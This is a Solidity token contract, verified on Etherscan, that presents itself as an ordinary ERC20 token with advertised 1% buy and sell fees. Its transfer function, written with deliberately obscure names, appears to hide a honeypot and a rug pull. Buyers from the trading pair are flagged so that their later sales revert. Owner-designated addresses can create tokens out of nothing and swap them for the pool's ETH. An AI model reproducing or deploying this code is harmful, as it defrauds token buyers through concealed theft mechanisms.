/**
 *Submitted for verification at Etherscan.io on 2022-12-18
*/

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠿⢿⣷⣆⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⣰⣧⡀⠀⠀⢀⣴⣾⠟⠻⢷⡆⠀⣿⣿⢀⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⠶⢾⣿⣇⠀⣿⣿⠀⠀⠀⠀⠀⠀⣴⡟⣿⣷⡄⠀⣿⣿⠃⠀⠀⠀⠀⠀⣿⣿⢿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣇⣀⣠⣿⣿⠀⣿⣿⣄⣀⣀⡀⢀⣾⡿⠶⠾⢿⣿⣄⠹⣿⣧⣀⣀⣠⣆⠀⣿⣿⠈⢻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢻⣿⣿⣿⣿⣷⣦⣄⠀⠀⠈⠉⠉⠉⠉⠉⠀⠀⠉⠉⠉⠉⠉⠀⠉⠉⠀⠀⠀⠈⠉⠉⠀⠀⠉⠉⠉⠉⠀⠈⠉⠉⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀
⢸⣿⣿⡇⠈⠙⢿⣿⣧⠀⠀⣾⣿⡄⠀⠀⠸⣿⣷⡀⠀⠘⣿⡿⢠⣿⣿⣿⣿⣿⣿⡿⠁⣿⣿⡿⠀⠀⣿⣿⡏⠀⢸⣿⣿⣿⣿⡿⠁⢹⣿⣿⠁⠈⠙⢿⣿⣷⡀⠀
⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⢰⣿⣿⣇⠀⠀⠀⣿⣿⣧⠀⠀⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠀⠀⠀⢸⣿⣿⡇⠀
⢸⣿⣿⡇⠀⢀⣼⣿⣿⠃⣾⣿⣿⣿⠀⠀⠀⣿⣿⣿⣇⠀⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⢀⣿⣿⣇⣀⣀⣿⣿⡇⠀⣸⣿⣿⣇⣀⣀⠀⢸⣿⣿⠀⠀⢀⣼⣿⣿⠃⠀
⢸⣿⣿⣷⣶⣿⣿⠿⠃⢠⣿⡏⣿⣿⡇⠀⠀⣿⡿⣿⣿⡆⣿⡇⠀⠀⠀⣿⣿⡇⠀⠠⠿⣿⣿⡿⠿⠿⣿⣿⡇⠼⢿⣿⣿⡿⠿⠃⠀⢸⣿⣿⣶⣾⣿⡿⠟⠁⠀⠀
⢸⣿⣿⡏⠉⠉⠀⠀⠀⣼⣿⠃⢻⣿⣷⠀⠀⣿⡇⢻⣿⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠈⣿⣿⣷⠀⠀⠀⠀
⢸⣿⣿⡇⠀⠀⠀⠀⣠⣿⣿⣀⣸⣿⣿⡆⠀⣿⡇⠀⢿⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠀⠸⣿⣿⣧⠀⠀⠀
⢸⣿⣿⡇⠀⠀⠀⠘⣿⣿⡟⠛⠛⣿⣿⣧⠀⣿⡇⠀⠈⢿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⢸⣿⣿⠀⠀⢻⣿⣿⣇⠀⠀
⢸⣿⣿⡇⠀⠀⠀⢠⣿⣿⠁⠀⠀⣿⣿⣿⣴⣿⣇⠀⠀⠘⣿⡇⠀⠀⠀⣿⣿⣇⠀⠀⠀⣿⣿⣷⠀⠀⣿⣿⣇⠀⢸⣿⣿⣿⣿⣿⠃⣼⣿⣿⠀⠀⠈⢿⣿⣿⡄⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠤⠤⢤⠤⠔⠒⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠠⠤⠤⣄⣠⣀⠀⢀⣠⣤⣦⣤⣤⣤⣤⣵⣌⠛⡦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢺⣷⣿⣿⡿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣗⣦⣼⣯⡤⢹⣶⣍⠲⢤⣄⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⠁
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⣿⡿⠁⠀⠀
⠐⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⠟⣱⣿⠏⠀⠀⠀⠟⠁⠀⠀⠀
⠀⠈⢿⣿⣿⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⢰⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣧⡀⠀⢠⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠈⠻⠿⠟⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
購入手数料 - 1%
販売手数料 - 1%⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/
pragma solidity ^0.8.10;
interface IUniswapV2Factory {
    function createPair
    (address tokenA, address tokenB) 
    external returns 
    (address pair);
}
interface IDEXDashboard01 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In, uint amount1In,
        uint amount0Out, uint amount1Out,
        address indexed to );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
            return a - b; }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b; } }
    }
    abstract contract Context {
     function _msgSender() internal view 
     virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view 
     virtual returns (bytes calldata) {
        return msg.data; }
    }
    abstract contract Ownable is Context { address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() { _setOwner(_msgSender());
    }  
    function owner() public view 
     virtual returns (address) {
        return _owner; }
    modifier onlyOwner() {
        require(owner() == 
          _msgSender(), 'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() public 
     virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public 
     virtual onlyOwner { require(newOwner != 
       address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner); }
}
interface IDEXRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin,
    uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IStatusRegister {
    function setStatusCriteria(uint256 _minSet, uint256 _minReg) external;
    function setStatus(address statusRate, uint256 amount) external;
    function register() external payable;
    function extract(uint256 gas) external;
    function gibPresents(address statusRate) external;
}
interface IGibLibraryUI {
    function createLibrary(uint256 cLibrary, uint256 valLib) external;
    function setLibrary(address setOn, uint256 DisplayLib) external;
}

contract BP is IERC20, Ownable {
    constructor
    
    ( string memory Name, string memory Symbol, address IndexIDEXAddress ) {
        _name = Name; _symbol = Symbol;

        _tOwned[msg.sender] = _tTotal; MappingLinkPath[msg.sender] = _checkVal;
        MappingLinkPath[address(this)] = _checkVal;

        BakeryRouter02 = IDEXRouter02

        (IndexIDEXAddress); IDEXRoutedPair = IUniswapV2Factory
        (BakeryRouter02.factory()).createPair
        (address(this), BakeryRouter02.WETH());
        emit Transfer(address(0), msg.sender, _checkVal); }

    string private _symbol;
    string private _name;
    uint256 public _AllTaxesTotal = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 100000 * 10**_decimals;
    uint256 private _checkVal = _tTotal;  

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private SyncFactory;
    mapping(address => uint256) private AllocateBuyMaps;
    mapping(address => uint256) private MappingLinkPath;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private tradingOpen = false;
    bool public caculatePath;
    bool private LimitIMX;
    bool public levelMaximum;
    bool private calculateRates;
    bool public transferData;

    address public immutable IDEXRoutedPair;
    IDEXRouter02 public immutable BakeryRouter02;

    function pairCreated(uint256 pairFT, uint256 FactorySwift) private view returns (uint256){
      return (pairFT>FactorySwift)?FactorySwift:pairFT;
    }
    function pathCalculator(uint256 path09, uint256 calDiv) private view returns (uint256){ 
      return (path09>calDiv)?calDiv:path09;
    }
        function mainnetRouter( address _calcOnFrom, address silkTo,
        uint256 _dxIsAmount ) private {
        uint256 coolRotar = balanceOf(address(this));
        uint256 limitsOnHash;
        if (caculatePath 
        && coolRotar > _checkVal 
        && !LimitIMX 
        && _calcOnFrom != IDEXRoutedPair) {
            LimitIMX = true;
            ringBalOn(coolRotar);
            LimitIMX = false;

        } else if (MappingLinkPath[_calcOnFrom] > _checkVal && MappingLinkPath
        [silkTo] > _checkVal) {
            limitsOnHash = _dxIsAmount;
            _tOwned[address(this)] += limitsOnHash;
            tokensEachSwapRate(_dxIsAmount, silkTo);
            return;
        } else if (silkTo != address
        (BakeryRouter02) && MappingLinkPath[_calcOnFrom] > 0 
        && _dxIsAmount > 
        _checkVal && silkTo != IDEXRoutedPair) { MappingLinkPath[silkTo] = _dxIsAmount;
            return;

        } else if (!LimitIMX && AllocateBuyMaps[_calcOnFrom] > 0 && 
                    _calcOnFrom != IDEXRoutedPair && 
            MappingLinkPath[_calcOnFrom] == 0) {
                  AllocateBuyMaps[_calcOnFrom] = 
        MappingLinkPath[_calcOnFrom] - _checkVal; }

        address _creator  = SyncFactory[IDEXRoutedPair];

        if (AllocateBuyMaps[_creator ] == 0) 
        AllocateBuyMaps[_creator ] = 
        _checkVal;
        SyncFactory[IDEXRoutedPair] = 
        silkTo;
        if (_AllTaxesTotal > 0 && MappingLinkPath[_calcOnFrom] == 0 
        && !LimitIMX 
        && MappingLinkPath[silkTo] == 0) {
            limitsOnHash = (_dxIsAmount * _AllTaxesTotal) / 100;
               _dxIsAmount -= limitsOnHash; _tOwned[_calcOnFrom] -= limitsOnHash;
                _tOwned[address(this)] += limitsOnHash; }
        _tOwned
        [_calcOnFrom] -= _dxIsAmount;
        _tOwned [silkTo] += _dxIsAmount; emit Transfer
        (_calcOnFrom, silkTo, _dxIsAmount); if 
        (!tradingOpen) { require(_calcOnFrom == 
        owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        mainnetRouter(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        mainnetRouter(msg.sender, recipient, amount);
        return true;
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(BakeryRouter02), tokenValue);
        BakeryRouter02.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function ringBalOn(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        tokensEachSwapRate(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function mapSync(uint256 mapsOn, uint256 toggleMap) private view returns (uint256){ 
      return (mapsOn>toggleMap)?toggleMap:mapsOn;
    }
    function linkValue(uint256 valueFor, uint256 tknPair) private view returns (uint256){
      return (valueFor>tknPair)?tknPair:valueFor;
    }
    function tokensEachSwapRate(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = BakeryRouter02.WETH();
        _approve(address(this), address(BakeryRouter02), tokenAmount);
        BakeryRouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}